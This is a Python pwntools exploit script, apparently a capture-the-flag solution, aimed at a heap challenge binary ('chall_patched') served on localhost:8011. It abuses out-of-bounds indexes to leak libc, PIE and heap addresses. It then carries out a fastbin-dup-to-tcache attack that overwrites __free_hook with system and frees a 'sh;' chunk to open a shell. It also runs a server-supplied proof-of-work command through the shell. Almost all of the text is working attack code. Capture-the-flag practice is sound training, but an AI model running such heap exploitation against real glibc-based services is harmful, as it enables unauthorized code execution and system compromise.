#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from keystone import *
from capstone import *

bin_path = './chall_patched'
exe = context.binary = ELF(args.EXE or bin_path)
context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc localhost 8011'.split()

libc_path = 'libc.so.6'
ld_path = 'ld-linux-x86-64.so.2'
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

try:
    if libc.stripped and not args.NOUNSTRIP:
        libcdb.unstrip_libc(libc)
except Exception as e:
    warn(f'Failed to unstrip libc: {e}')

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def fasm(code, pp=True):
    ks = Ks(KS_ARCH_X86, KS_MODE_64 if context.arch == 'amd64' else KS_MODE_32)
    if pp:
        code = cpp(code)
    encoding, _ = ks.asm(code)
    return bytes(encoding)

def fdisasm(code, vma=0x0):
    md = Cs(CS_ARCH_X86, CS_MODE_64 if context.arch == 'amd64' else CS_MODE_32)
    instructions = []
    for i in md.disasm(code, vma):
        instructions.append("0x{:x}:\t{}\t{}".format(i.address, i.mnemonic, i.op_str))
    return "\n".join(instructions)

def ua(x):
    return int.from_bytes(x, 'little')

def se(x):
    return str(x).encode()

def cyc(x):
    n = 8 if context.arch == 'amd64' else 4
    return cyclic(x, n=n)

def solve_pow(crib=b'pwn.red'):
    if args.LOCAL:
        return
    with log.progress("Solving PoW..."):
        cmd = p.recvline_contains(crib).decode().strip()
        output = subprocess.check_output(cmd, shell=True)
        p.sendline(output)

gdbscript = '''
# b *(send_gift+107)
continue
'''.format(**locals())

def create(idx, a=b'adam\n', b=b'adam\n', c=b'adam\n'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', a)
    p.sendafter(b': ', b)
    p.sendafter(b': ', c)
    
def view(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

p = start()

# leak libc
view(-4)
p.recvuntil(b'To: ')
leak_libc = ua(p.recv(6))
logx.leak_libc
libc.address = leak_libc - (libc.sym['_IO_2_1_stderr_']+131)
logx.libc

# leak pie
view(-11)
p.recvuntil(b'From: ')
leak_pie = ua(p.recv(6))
logx.leak_pie
exe.address = leak_pie - exe.sym['__dso_handle']
logx.exe

# malloc buat initiate heap
create(0)

# leak heap dari main arena
target = ( (libc.sym.main_arena+112) - exe.sym.gifts) // 8
view(target)

p.recvuntil(b'From: ')
leak_heap = ua(p.recv(6))
logx.leak_heap

delete(0)
for i in range(7):
    create(i)
    
create(8)
create(9)

# simpen pointer ke fastbin yang mau di-dup
create(10, p64(leak_heap + 0x130))

for i in range(7):
    delete(i)
    
delete(8)
delete(9)

target_idx = ((leak_heap + 0x190)-exe.sym.gifts)//8
delete(target_idx)

for i in range(7):
    create(i)

# fastbin jadi tcache
create(8, p64(libc.sym['__free_hook']))
create(9)
create(14, b'sh;')
create(15, p64(libc.sym.system))
delete(14)

p.interactive()
